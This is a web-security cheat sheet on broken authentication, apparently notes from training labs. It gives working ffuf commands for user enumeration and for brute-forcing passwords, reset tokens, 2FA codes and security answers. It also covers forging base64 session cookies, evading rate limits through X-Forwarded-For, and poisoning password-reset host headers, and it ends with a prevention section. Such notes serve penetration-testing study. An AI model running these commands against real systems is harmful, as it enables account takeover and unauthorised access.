# Broken Authentication

## Overview

Broken authentication refers to flaws in the implementation of authentication mechanisms that allow attackers to bypass or defeat authentication controls, leading to unauthorised access or account compromise.

### Categories of Authentication Factors

- **Knowledge**: passwords, PINs, Answer to Security Question
- **Ownership**: ID cards, TOTP, Authenticator App, Security Token
- **Inherence**: Biometric authentication

## Attack Surface

Authentication mechanisms and related functionality present multiple areas that can be targeted:

- Login and authentication endpoints
- Password reset and account recovery flows
- Multi-factor / 2FA verification steps
- Session management and token handling (cookies, tokens)
- Protected pages, resources, and admin interfaces
- API authentication endpoints
- "Remember me" or persistent login features

Weaknesses often arise from insufficient server-side validation, predictable or low-entropy tokens, lack of rate limiting, overly verbose error messages, or missing access checks that rely only on client-side redirects.

## Identification

1. Analyse login, reset, or MFA responses for differences that indicate valid vs. invalid usernames/accounts (varying error messages, HTTP status codes, response delays/timing, or account lockout behaviour).
  - Status code changes between valid and invalid usernames.
  - Different (sometimes subtle) error messages.
  - Delayed responses for certain inputs.
  - Correct usernames may receive a lockout message after a certain number of failed login attempts (while invalid usernames do not).
2. Probe for absence of rate limiting or weak protections on authentication actions such as login attempts, password resets, and 2FA code submission.
  - Correct/successful login details may receive a different rate limit response (or none) compared to failed attempts.
3. Examine session cookies or other tokens for patterns: insufficient entropy, sequential/incrementing values, encoding of user data (e.g. base64), or large fixed portions with only small varying components.
  - Check "stay logged in" or persistent cookies to see if they are easily decrypted or contain predictable data.
4. Attempt direct navigation to protected URLs and observe whether authentication/authorisation is properly enforced server-side.
5. Review password reset and recovery flows for guessable tokens, logic issues (e.g. token not required after initial step), or information leakage.
  - Check if a reset URL token is easily decrypted or predictable.
  - Verify whether the reset token is actually required to complete the password reset after the initial link is followed.
  - Test for different error messages when new password fields do not match (these differences can sometimes be abused to brute-force values for a victim's account during reset).
6. Test whether client-side controls, parameter values, or response status codes can be manipulated to bypass authentication.

## Exploitation

### Brute-Force Attacks

- **User Enumeration** 

```bash
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```

- **Brute-Forcing Passwords**

```bash
grep '[[:upper:]]' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username or password"
```

- **Brute-Forcing Password Reset Tokens** (example based on weak 4 digit reset token sent via email)

```bash
seq -w 0 9999 > tokens.txt # -w pads numbers with prepending zeros
ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```

- **Brute-Forcing 2FA Codes** (example based on weak 4 digit TOTP token)

```bash
seq -w 0 9999 > tokens.txt
ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

### Bypassing Brute-Force Protection

- **Rate Limit**: X-Forwarded-For HTTP Header can be randomised (or use other headers such as X-Forward-Host in some flows).
- **Iterate logins**: Alternate between a successful login (using known good credentials) and brute-force attempts to reset or avoid rate limit counters.
- **CAPTCHAs**: Look for CAPTCHA solution in HTML code.

### MFA Attacks

- Brute-forcing 2FA codes is possible when codes have low entropy and there is no rate limiting or it can be bypassed (see Brute-Force Attacks above).

### Password Attacks

**Default Credentials**
  - [CIRT.net](https://cirt.net/passwords/)
  - SecLists Default Credentials (SecLists\Passwords\Default-Credentials\)
  - [SCADA](https://github.com/scadastrangelove/SCADAPASS/tree/master)
**Vulnerable Password Reset**
  - Guessable Security Questions (for example brute force [world cities](https://github.com/datasets/world-cities/blob/main/data/world-cities.csv))
  ```bash
  cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt # all world cities
  cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt # just german cities
  ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
  ```
  - Check if reset URL tokens are easily decrypted or contain predictable data.
  - Username Injection in Password Reset Request (check post parameters in http request).
  - Test whether the reset token from the initial request URL is actually enforced when submitting the new password (some flows only check it on the first step).
  - **Host header poisoning on reset**: Set the `X-Forward-Host` header (pointing to an attacker-controlled server) when submitting a password reset request. This can cause the reset link/token to be sent to the attacker's server instead of (or in addition to) the legitimate user.
  - During the final password reset step, observe whether different error messages are returned when the two "new password" fields do not match. These discrepancies can sometimes be used to brute-force a victim's password (or other values) in the reset flow.

### Authentication Bypasses

- Accessing the protected page directly
  - go directly to hidden page /admin.php
  - catch the response in burp
  - change status code from 302 to 200
- Manipulating HTTP Parameters to access protected pages
  - Log in as regular user directs to /admin.php?user_id=183
  - guess or bruteforce id parameter
```bash
seq 1 1000 > user_ids.txt
ffuf -w user_ids.txt -u http://STMIP:STMPO/admin.php?user_id=FUZZ -fr "Could not load admin data."
```

### Session Attacks

- **Cookies**
  - Check if "stay logged in" or persistent cookies are easily decrypted or contain guessable/predictable values (see token analysis examples below).
  - Brute-Forcing cookies with insufficient entropy
    - Capture multiple session tokens and compare for similarities
    - Session cookie may be long but most of it is fixed with only a small amount changing with each user
    - Session cookies could also increment and not be random thus easy to enumerate past/future session tokens
    - Tokens may be encoded values of the logon information
    - Try decoding session tokens to see if not truly random
```bash
echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d
echo -n 'user=htb-stdnt;role=admin' | base64 # base64 encode
echo -n 'user=htb-stdnt;role=admin' | xxd -p # hex encode
```
  - XSS can be used to steal session cookies from other users (see related XSS documentation).
- **[Session Fixation](https://owasp.org/www-community/attacks/Session_fixation)**
  - Attacker obtains valid session identifier
  - Attacker coerces victim to use this session identifier (social engineering)
  - Victim authenticates to the vulnerable web application
  - Attacker knows the victim's session identifier and can hijack their account
- **[Improper Session Timeout](https://owasp.org/www-community/Session_Timeout)**
  - Sessions should expire after an appropriate time interval
  - Session validity duration depends on the web application

## Impact

Successful exploitation of broken authentication can result in:

- Complete compromise of user accounts
- Unauthorised access to sensitive data and application functionality
- Privilege escalation (e.g. from regular user to administrator)
- Session hijacking and full user impersonation
- Circumvention of other security controls

## Prevention

- Enforce strong password policies (length, complexity) and support the use of password managers.
- Implement rate limiting and account lockouts for authentication attempts, password resets, and MFA, while ensuring responses do not leak whether an account is valid.
- Require and correctly implement multi-factor authentication (MFA/2FA) for sensitive accounts or actions.
- Use cryptographically secure, high-entropy session identifiers. Regenerate the session ID after successful login and on privilege elevation. Apply `HttpOnly`, `Secure`, and `SameSite` cookie attributes. Enforce reasonable idle and absolute timeouts.
- Protect password reset and recovery flows with high-entropy, single-use, time-limited tokens delivered out-of-band. Avoid (or strongly secure) security questions.
- Do not differentiate error messages or behaviour between valid and invalid usernames or credentials.
- Perform all authentication and authorisation decisions server-side. Never trust client-side logic, hidden fields, or simple redirect responses (e.g. 302) for protection.
- Ensure logout fully invalidates sessions server-side.
- Prefer well-tested authentication libraries/frameworks over custom implementations.
- Consider additional controls such as device fingerprinting, IP reputation, or anomaly detection for high-value applications.

## Tools & Payloads

### Enumeration and Brute Forcing with ffuf

User enumeration, password brute-forcing, reset token brute-forcing, and 2FA brute-forcing examples are shown in the Exploitation section.

### Generating Sequential Test Values

```bash
seq -w 0 9999 > tokens.txt # -w pads numbers with prepending zeros (useful for 4-digit codes)
seq 1 1000 > user_ids.txt
```

### Filtering Wordlists to Match Password Policies

```bash
grep '[[:upper:]]' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```

### Analysing / Decoding Session Tokens

```bash
echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d
echo -n 'user=htb-stdnt;role=admin' | base64 # base64 encode
echo -n 'user=htb-stdnt;role=admin' | xxd -p # hex encode
```

### Password Reset / Security Question Wordlist Example

```bash
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt # all world cities
cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt # just german cities
```

### Useful Resources for Default Credentials

- [CIRT.net](https://cirt.net/passwords/)
- SecLists Default Credentials (`SecLists/Passwords/Default-Credentials/`)
- [SCADAPASS](https://github.com/scadastrangelove/SCADAPASS/tree/master)

### Common Testing Tools

- `ffuf` (fuzzing/brute force)
- `seq` (generate number sequences)
- `grep` (wordlist filtering)
- Burp Suite / browser dev tools (intercept and modify responses, analyse cookies, tamper with MFA/verify cookies, test host headers)
- Base64 / hex / other decoding tools (for token analysis, including stay-logged-in and reset tokens)
- Manual header manipulation (X-Forwarded-For, X-Forward-Host) for rate limit evasion and password reset poisoning

### Types of Brute Forcing (Authentication Context)

| Attack Type          | Description                                                                 | Best Used When |
|----------------------|-----------------------------------------------------------------------------|----------------|
| Simple Brute Force   | Tries every possible character combination                                 | No prior password information |
| Dictionary Attack    | Uses pre-compiled lists of common passwords                                 | Weak or patterned passwords likely |
| Hybrid Attack        | Dictionary + mutations (numbers/symbols)                                    | Slightly modified common passwords |
| Credential Stuffing  | Uses leaked credentials from other breaches                                 | Password reuse suspected |
| Password Spraying    | Common passwords across many accounts                                       | Lockout policies in place |
| Reverse Brute Force  | Known password against many usernames                                       | Password reuse across accounts |

**Default Credentials Resources**:
- Common device defaults (Linksys/D-Link/Netgear admin/admin or admin/password, etc.)
- SecLists `Passwords/Default-Credentials/`
- SCADAPASS and similar lists for specialized systems

Fold these into rate limit and password reset testing where relevant.
